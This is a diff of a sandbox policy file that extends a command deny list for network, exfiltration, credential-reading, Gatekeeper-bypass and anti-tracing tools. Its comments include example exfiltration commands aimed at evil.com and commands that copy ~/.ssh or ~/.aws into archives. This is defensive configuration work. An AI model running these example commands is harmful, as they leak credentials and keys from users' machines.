@@ -15,43 +15,67 @@ network:
 # Block network-capable commands, privilege escalation, and network config.
 commands:
   deny:
-    # HTTP/download tools
-    - curl
-    - wget
-    - aria2c
-    # Remote access / file transfer
-    - ssh
-    - scp
-    - sftp
-    - ftp
-    - rsync
-    # Raw networking
-    - nc
-    - ncat
-    - netcat
-    - socat
-    - telnet
-    - openssl
-    # Network reconnaissance
-    - nmap
-    - ping
-    - ping6
-    - traceroute
-    - tracepath
-    # DNS tools
-    - dig
-    - nslookup
-    - host
-    # Privilege escalation (can change network config)
+    # HTTP/download tools — primary data exfiltration vectors
+    - curl           # HTTP client: can POST data to external servers
+    - wget           # HTTP client: can upload via --post-data
+    - aria2c         # download manager with RPC interface
+    # Remote access / file transfer — can establish outbound connections
+    - ssh            # interactive shell on remote host
+    - scp            # copy files over SSH
+    - sftp           # interactive file transfer over SSH
+    - ftp            # unencrypted file transfer
+    - rsync          # bidirectional file sync, can exfil over SSH
+    # Raw networking — can open arbitrary TCP/UDP connections, reverse shells
+    - nc             # netcat: raw TCP/UDP, reverse shells
+    - ncat           # nmap's netcat with SSL
+    - netcat         # alternate netcat name
+    - socat          # bidirectional data relay
+    - telnet         # unencrypted remote connections
+    - openssl        # encrypted channel: openssl s_client -connect host:443
+    # Network reconnaissance — can probe internal/external hosts
+    - nmap           # port scanner
+    - ping           # ICMP echo (can also encode data in ICMP payloads)
+    - ping6          # IPv6 ICMP echo
+    - traceroute     # maps network path to external hosts
+    - tracepath      # similar to traceroute
+    # DNS tools — can exfiltrate data via DNS queries
+    - dig            # DNS lookup (dig @evil.com secret.encoded.evil.com)
+    - nslookup       # DNS lookup
+    - host           # DNS lookup
+    # Privilege escalation — can reconfigure network settings
     - sudo
     - su
     - doas
-    # Network configuration
-    - ip
-    - ifconfig
-    - iptables
-    - nft
-    - route
+    # Network configuration — can create interfaces, routes, firewall rules
+    - ip             # configure interfaces, routes (Linux)
+    - ifconfig       # configure interfaces (legacy)
+    - iptables       # configure firewall rules (Linux)
+    - nft            # nftables firewall (Linux)
+    - route          # configure routing table
+    # Scripting interpreters — arbitrary code execution bypassing traced process
+    - osascript
+    - swift
+    - java
+    # Data exfiltration — can leak files without network hooks seeing it
+    - open         # opens URLs in browser: open "http://evil.com/?d=$(cat creds)"
+    - sqlite3      # queries browser credential DBs (Chrome Login Data, etc.)
+    - ditto        # bulk file copy: ditto ~/.ssh /tmp/exfil
+    - zip          # bulk file archival: zip -r /tmp/x.zip ~/.aws
+    # Credential/config readers — macOS system stores
+    - plutil
+    - defaults
+    # Reconnaissance — locates credential files via Spotlight
+    - mdfind
+    - mdls
+    # Security bypass — disables macOS protections
+    - xattr        # quarantine removal
+    - codesign     # re-sign modified binaries
+    - spctl        # disable Gatekeeper
+    - hdiutil      # disk image manipulation
+    # Anti-tracing — can terminate the malwi agent/CLI
+    - kill
+    - pkill
+    - killall
 
 # Block ALL networking at the C level — catches Python socket.connect(),
 # Node.js net.connect(), and Bash /dev/tcp regardless of runtime.
